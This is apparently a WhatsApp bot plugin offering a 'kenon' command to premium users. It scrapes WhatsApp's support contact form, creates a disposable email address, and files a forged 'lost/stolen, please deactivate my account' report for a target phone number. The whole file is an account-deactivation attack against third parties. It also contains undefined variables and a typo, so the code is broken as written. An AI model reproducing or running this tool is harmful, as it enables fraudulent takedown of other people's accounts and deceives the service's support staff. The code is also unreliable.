let handler = async(m, { conn, text }) => {
if (!isRowner) return m.reply(`*❗Khusus Premium*`)
let cekno = await haikal.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`❗Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
var targetnya = m.sender.split('@')[0]
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Verloren/gestohlen: Bitte deaktivieren Sie mein Konto")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
conn.sendMessage(m.chat, { text: util.format(res.data)}, {quoted:m})
}
handler.help = ['kenon']
handler.tags = ['developer']
handler.command = /^(kenon)$/i
handler.limit = true
handle.premium = true
export default handler